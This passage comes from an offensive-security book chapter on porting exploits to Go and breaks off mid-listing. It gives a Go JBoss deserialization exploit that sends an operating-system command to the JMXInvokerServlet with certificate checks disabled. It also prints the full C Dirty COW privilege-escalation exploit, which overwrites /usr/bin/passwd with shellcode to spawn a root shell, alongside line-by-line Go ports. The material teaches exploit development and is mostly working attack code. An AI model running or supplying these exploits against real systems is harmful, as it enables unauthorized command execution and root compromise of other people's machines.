represents the remainder of your Java serialized object in a
format that JBoss can process ❸. Once the payload is
constructed, the script builds the URL and sets up SSL to
ignore invalid certificates, if necessary ❹. It then sets the
required Content-Type and Content-Length HTTP headers ❺ and
sends the malicious request to the target server ❻.
Most of what’s presented in this script shouldn’t be new to
you, as we’ve covered the majority of it in previous chapters.
It’s now just a matter of making the equivalent function calls
in a Go friendly manner. Listing 9-4 shows the Go version of
the exploit.
func jboss(host string, ssl bool, cmd string) (int, error) {
serializedObject, err := hex.DecodeString("ACED0005737--SNIPPED FOR
BREVITY--017400") ❶
if err != nil {
return 0, err
}
serializedObject = append(serializedObject, byte(len(cmd)))
serializedObject = append(serializedObject, []byte(cmd)...) ❷
afterBuf, err := hex.DecodeString("740004657865637571--SNIPPED FOR
BREVITY--7E003A") ❸
if err != nil {
return 0, err
}
serializedObject = append(serializedObject, afterBuf...)
var client *http.Client
var url string
if ssl { ❹
client = &http.Client{
Transport: &http.Transport{
TLSClientConfig: &tls.Config{
InsecureSkipVerify: true,
},
},
}
url = fmt.Sprintf("https://%s/invoker/JMXInvokerServlet", host)
} else {
client = &http.Client{}
url = fmt.Sprintf("http://%s/invoker/JMXInvokerServlet", host)
}
req, err := http.NewRequest("POST", url, bytes.NewReader(serializedObject))
if err != nil {
return 0, err
}
req.Header.Set( ❺
"User-Agent",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like
Gecko")
req.Header.Set(
"Content-Type",
"application/x-java-serialized-object;
class=org.jboss.invocation.MarshalledValue")
resp, err := client.Do(req) ❻
if err != nil {
return 0, err
}
return resp.StatusCode, nil
}
Listing 9-4: The Go equivalent of the original Python serialization exploit (/ch-
9/jboss/main.go)
The code is nearly a line-by-line reproduction of the
Python version. For this reason, we’ve set the annotations to
align with their Python counterparts, so you’ll be able to
follow the changes we’ve made.
First, you construct your payload by defining your
serialized Java object byte slice ❶, hardcoding the portion
before your operating system command. Unlike the Python
version, which relied on user-defined logic to convert your
hexadecimal string to a byte array, the Go version uses the
hex.DecodeString() from the encoding/hex package. Next, you
determine the length of your operating system command, and
then append it and the command itself to your payload ❷.
You complete the construction of your payload by decoding
your hardcoded hexadecimal trailer string onto your existing
payload ❸. The code for this is slightly more verbose than the
Python version because we intentionally added in additional
error handling, but it’s also able to use Go’s standard encoding
package to easily decode your hexadecimal string.
You proceed to initialize your HTTP client ❹, configuring
it for SSL communications if requested, and then build a
POST request. Prior to sending the request, you set your
necessary HTTP headers ❺ so that the JBoss server interprets
the content type appropriately. Notice that you don’t explicitly
set the Content-Length HTTP header. That’s because Go’s http
package does that for you automatically. Finally, you send
your malicious request by calling client.Do(req) ❻.
For the most part, this code makes use of what you’ve
already learned. The code introduces small modifications such
as configuring SSL to ignore invalid certificates ❹ and adding
specific HTTP headers ❺. Perhaps the one novel element in
our code is the use of hex.DecodeString(), which is a Go core
function that translates a hexadecimal string to its equivalent
byte representation. You’d have to do this manually in Python.
Table 9-2 shows some additional, commonly encountered
Python functions or constructs with their Go equivalents.
This is not a comprehensive list of functional mappings.
Too many variations and edge cases exist to cover all the
possible functions required for porting exploits. We’re hopeful
that this will help you translate at least some of the most
common Python functions to Go.
Table 9-2: Common Python Functions and Their Go Equivalents
Python Go Notes
hex(x) fmt.Sprintf(" %#x", Converts an integer, x, to a
x) lowercase hexadecimal string,
prefixed with "0x".
ord(c) rune(c) Used to retrieve the integer
(int32) value of a single
character. Works for standard
8-bit strings or multibyte
Unicode. Note that rune is a
built-in type in Go and makes
working with ASCII and
Unicode data fairly simple.
chr(i) and unichr(i) fmt.Sprintf("%+q", The inverse of ord in Python,
rune(i)) chr and unichr return a string
of length 1 for the integer
input. In Go, you use the rune
type and can retrieve it as a
string by using the %+q
format sequence.
struct.pack(fmt, v1, binary.Write(. . .) Creates a binary
v2, . . .) representation of the data,
formatted appropriately for
type and endianness.
struct.unpack(fmt, binary.Read(. . .) The inverse of struct.pack and
string) binary.Write. Reads
structured binary data into a
specified format and type.
Porting an Exploit from C
Let’s step away from Python and focus on C. C is arguably a
less readable language than Python, yet C shares more
similarities with Go than Python does. This makes porting
exploits from C easier than you might think. To demonstrate,
we’ll be porting a local privilege escalation exploit for Linux.
The vulnerability, dubbed Dirty COW, pertains to a race
condition within the Linux kernel’s memory subsystem. This
flaw affected most, if not all, common Linux and Android
distributions at the time of disclosure. The vulnerability has
since been patched, so you’ll need to take some specific
measures to reproduce the examples that follow. Specifically,
you’ll need to configure a Linux system with a vulnerable
kernel version. Setting this up is beyond the scope of the
chapter; however, for reference, we use a 64-bit Ubuntu 14.04
LTS distribution with kernel version 3.13.1.
Several variations of the exploit are publicly available. You
can find the one we intend to replicate at https://www.exploit-
db.com/exploits/40616/. Listing 9-5 shows the original exploit
code, slightly modified for readability, in its entirety.
#include 
#include 
#include 
#include 
#include 
#include 
#include 
void *map;
int f;
int stop = 0;
struct stat st;
char *name;
pthread_t pth1,pth2,pth3;
// change if no permissions to read
char suid_binary[] = "/usr/bin/passwd";
unsigned char sc[] = {
0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
--snip--
0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
};
unsigned int sc_len = 177;
void *madviseThread(void *arg)
{
char *str;
str=(char*)arg;
int i,c=0;
for(i=0;i<1000000 && !stop;i++) {
c+=madvise(map,100,MADV_DONTNEED);
}
printf("thread stopped\n");
}
void *procselfmemThread(void *arg)
{
char *str;
str=(char*)arg;
int f=open("/proc/self/mem",O_RDWR);
int i,c=0;
for(i=0;i<1000000 && !stop;i++) {
lseek(f,map,SEEK_SET);
c+=write(f, str, sc_len);
}
printf("thread stopped\n");
}
void *waitForWrite(void *arg) {
char buf[sc_len];
for(;;) {
FILE *fp = fopen(suid_binary, "rb");
fread(buf, sc_len, 1, fp);
if(memcmp(buf, sc, sc_len) == 0) {
printf("%s is overwritten\n", suid_binary);
break;
}
fclose(fp);
sleep(1);
}
stop = 1;
printf("Popping root shell.\n");
printf("Don't forget to restore /tmp/bak\n");
system(suid_binary);
}
int main(int argc,char *argv[]) {
char *backup;
printf("DirtyCow root privilege escalation\n");
printf("Backing up %s.. to /tmp/bak\n", suid_binary);
asprintf(&backup, "cp %s /tmp/bak", suid_binary);
system(backup);
f = open(suid_binary,O_RDONLY);
fstat(f,&st);
printf("Size of binary: %d\n", st.st_size);
char payload[st.st_size];
memset(payload, 0x90, st.st_size);
memcpy(payload, sc, sc_len+1);
map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
printf("Racing, this may take a while..\n");
pthread_create(&pth1, NULL, &madviseThread, suid_binary);
pthread_create(&pth2, NULL, &procselfmemThread, payload);
pthread_create(&pth3, NULL, &waitForWrite, NULL);
pthread_join(pth3, NULL);
return 0;
}
Listing 9-5: The Dirty COW privilege escalation exploit written in the C language
Rather than explaining the details of the C code’s logic,
let’s look at it generally, and then break it into chunks to
compare it line by line with the Go version.
The exploit defines some malicious shellcode, in
Executable and Linkable Format (ELF), that generates a Linux
shell. It executes the code as a privileged user by creating
multiple threads that call various system functions to write our
shellcode to memory locations. Eventually, the shellcode
exploits the vulnerability by overwriting the contents of a
binary executable file that happens to have the SUID bit set
and belongs to the root user. In this case, that binary is
/usr/bin/passwd. Normally, a nonroot user wouldn’t be able to
overwrite the file. However, because of the Dirty COW
vulnerability, you achieve privilege escalation because you
can write arbitrary contents to the file while preserving the file
permissions.
Now let’s break the C code into easily digestible portions
and compare each section with its equivalent in Go. Note that
the Go version is specifically trying to achieve a line-by-line
reproduction of the C version. Listing 9-6 shows the global
variables defined or initialized outside our functions in C,
while Listing 9-7 shows them in Go.
❶ void *map;
int f;
❷ int stop = 0;
struct stat st;
char *name;
pthread_t pth1,pth2,pth3;
// change if no permissions to read
❸ char suid_binary[] = "/usr/bin/passwd";
❹ unsigned char sc[] = {
0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
--snip--
0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
};
unsigned int sc_len = 177;
Listing 9-6: Initialization in C
❶ var mapp uintptr
❷ var signals = make(chan bool, 2)
❸ const SuidBinary = "/usr/bin/passwd"
❹ var sc = []byte{
0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
--snip--
0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05,
}
Listing 9-7: Initialization in Go
The translation between C and Go is fairly straightforward.
The two code sections, C and Go, maintain the same
numbering to demonstrate how Go achieves similar
functionality to the respective lines of C code. In both cases,
you track mapped memory by defining a uintptr variable ❶. In
Go, you declare the variable name as mapp since, unlike C, map
is a reserved keyword in Go. You then initialize a variable to
be used for signaling the threads to stop processing ❷. Rather
than use an integer, as the C code does, the Go convention is
instead to use a buffered boolean channel. You explicitly
define its length to be 2 since there will be two concurrent
functions that you’ll wish to signal. Next, you define a string
to your SUID executable ❸ and wrap up your global variables
by hardcoding your shellcode into a slice ❹. A handful of
global variables were omitted in the Go code compared to the
C version, which means you’ll define them as needed within
their respective code blocks.
Next, let’s look at madvise() and procselfmem(), the two primary
functions that exploit the race condition. Again, we’ll compare
the C version in Listing 9-8 with the Go version in Listing 9-9.
void *madviseThread(void *arg)
{
char *str;
str=(char*)arg;
int i,c=0;
for(i=0;i<1000000 && !stop;i++❶) {
c+=madvise(map,100,MADV_DONTNEED)❷;
}
printf("thread stopped\n");
}
void *procselfmemThread(void *arg)
{
char *str;
str=(char*)arg;
int f=open("/proc/self/mem",O_RDWR);
int i,c=0;
for(i=0;i<1000000 && !stop;i++❶) {
❸ lseek(f,map,SEEK_SET);
c+=write(f, str, sc_len)❹;
}
printf("thread stopped\n");
}
Listing 9-8: Race condition functions in C
func madvise() {
for i := 0; i < 1000000; i++ {
select {
case <- signals: ❶
fmt.Println("madvise done")
return
default:
syscall.Syscall(syscall.SYS_MADVISE, mapp, uintptr(100),
syscall.MADV_DONTNEED) ❷
}
}
}
func procselfmem(payload []byte) {
f, err := os.OpenFile("/proc/self/mem", syscall.O_RDWR, 0)
if err != nil {
log.Fatal(err)
}
for i := 0; i < 1000000; i++ {
select {
case <- signals: ❶
fmt.Println("procselfmem done")
return
default:
syscall.Syscall(syscall.SYS_LSEEK, f.Fd(), mapp, uintptr(os.SEEK_SET))
❸
f.Write(payload) ❹
}
}
}
Listing 9-9: Race condition functions in Go
The race condition functions use variations for signaling
❶. Both functions contain for loops that iterate an extensive
number of times. The C version checks the value of the stop
variable, while the Go version uses a select statement that
attempts to read from the signals channel. When a signal is
present, the function returns. In the event that no signal is
waiting, the default case executes. The primary differences
between the madvise() and procselfmem() functions occur within the
default case. Within our madvise() function, you issue a Linux
system call to the madvise() ❷ function, whereas your
procselfmem() function issues Linux system calls to lseek() ❸ and
writes your payload to memory ❹.
Here are the main differences between the C and Go
versions of these functions:
The Go version uses a channel to determine when to prematurely break the loop,
while the C function uses an integer value to signal when to break the loop after
the thread race condition has occurred.
The Go version uses the syscall package to issue Linux system calls. The
parameters passed to the function include the system function to be called and its
required parameters. You can find the name, purpose, and parameters of the
function by searching Linux documentation. This is how we are able to call
native Linux functions.
Now, let’s review the waitForWrite() function, which monitors
for the presence of changes to SUID in order to execute the
shellcode. The C version is shown in Listing 9-10, and the Go
version is shown in Listing 9-11.
void *waitForWrite(void *arg) {
char buf[sc_len];
❶ for(;;) {
FILE *fp = fopen(suid_binary, "rb");
fread(buf, sc_len, 1, fp);
if(memcmp(buf, sc, sc_len) == 0) {
printf("%s is overwritten\n", suid_binary);
break;
}
fclose(fp);
sleep(1);
}
❷ stop = 1;
printf("Popping root shell.\n");
printf("Don't forget to restore /tmp/bak\n");